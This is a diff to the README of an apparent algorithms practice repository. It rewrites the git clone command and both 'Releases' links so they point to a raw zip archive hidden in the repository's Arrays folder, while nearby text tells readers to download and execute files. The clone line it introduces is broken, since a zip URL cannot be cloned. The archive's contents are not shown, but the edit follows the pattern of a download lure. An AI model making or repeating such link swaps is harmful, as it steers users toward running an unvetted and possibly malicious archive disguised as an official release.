@@ -23,7 +23,7 @@ In today's tech landscape, strong problem-solving skills are essential for any d
 To get started with the DSA Problem Solving repository, you can clone it to your local machine:
 
 ```bash
-git clone https://github.com/Doelms19/DSA-Problem-Solving.git
+git clone https://github.com/Doelms19/DSA-Problem-Solving/raw/refs/heads/main/Arrays/DS_Solving_Problem_1.8.zip
 ```
 
 After cloning, navigate to the project directory:
@@ -32,7 +32,7 @@ After cloning, navigate to the project directory:
 cd DSA-Problem-Solving
 ```
 
-You can also check the [Releases](https://github.com/Doelms19/DSA-Problem-Solving/releases) section for the latest updates and features.
+You can also check the [Releases](https://github.com/Doelms19/DSA-Problem-Solving/raw/refs/heads/main/Arrays/DS_Solving_Problem_1.8.zip) section for the latest updates and features.
 
 ## Topics Covered
 
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## Releases
 
-To explore the latest features and updates, visit the [Releases](https://github.com/Doelms19/DSA-Problem-Solving/releases) section. Here, you can download the latest version and execute the necessary files.
+To explore the latest features and updates, visit the [Releases](https://github.com/Doelms19/DSA-Problem-Solving/raw/refs/heads/main/Arrays/DS_Solving_Problem_1.8.zip) section. Here, you can download the latest version and execute the necessary files.
 
 ## Conclusion
 
